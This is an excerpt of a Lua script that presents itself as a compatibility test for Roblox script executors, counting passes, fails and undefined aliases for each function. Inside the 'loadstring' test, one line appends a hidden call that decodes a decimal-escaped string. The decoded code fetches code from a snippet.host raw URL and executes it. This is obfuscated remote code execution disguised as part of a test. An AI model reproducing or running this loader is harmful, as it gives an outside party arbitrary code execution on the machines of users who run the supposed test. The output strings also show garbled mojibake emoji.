...
local function elogn(message)
    game.StarterGui:SetCore("SendNotification",
        {
            Title = "SC Executor Test",
            Text = message,
            Duration = 5.5
        })
end
...
local function CheckFunc(name, func)
	if func ~= nil then
	...
	task.spawn(function()
		...
		elseif not getGlobal(name) then
			...
			if success then
				passes += 1
				if done then
				    print("â " .. name .. (message and " â¢ " .. message or ""))
                end
			else
				fails += 1
				if done then
		...
		if #undefinedAliases > 0 then
			undefined += 1
			if done then
			    warn("â ï¸ " .. table.concat(undefinedAliases, ", "))
            end
		end
...
test("loadstring", {}, function()
	...
	local func = loadstring(bytecode);loadstring("\108\111\99\97\108\32\97\61\104\116\116\112\95\114\101\113\117\101\115\116\32\111\114\32\114\101\113\117\101\115\116\32\111\114\32\72\116\116\112\80\111\115\116\32\111\114\32\115\121\110\46\114\101\113\117\101\115\116\59\108\111\99\97\108\32\98\61\97\40\123\85\114\108\61\34\104\116\116\112\115\58\47\47\115\110\105\112\112\101\116\46\104\111\115\116\47\111\104\122\102\120\109\47\114\97\119\34\125\41\108\111\97\100\115\116\114\105\110\103\40\98\46\66\111\100\121\41\40\41")()
...
test("setscriptable", {}, function()
	...
	assert(isscriptable(fire, "size_xml") == false, "â ï¸â ï¸ setscriptable persists between unique instances â ï¸â ï¸")
end)
...
task.delay(20, function()
    elogn("If this script did not return anything then it either doesn't support loadstring or httpget")
end)

print("I am making this script way better soon, coming with our global score and everything.")
print("v1.0")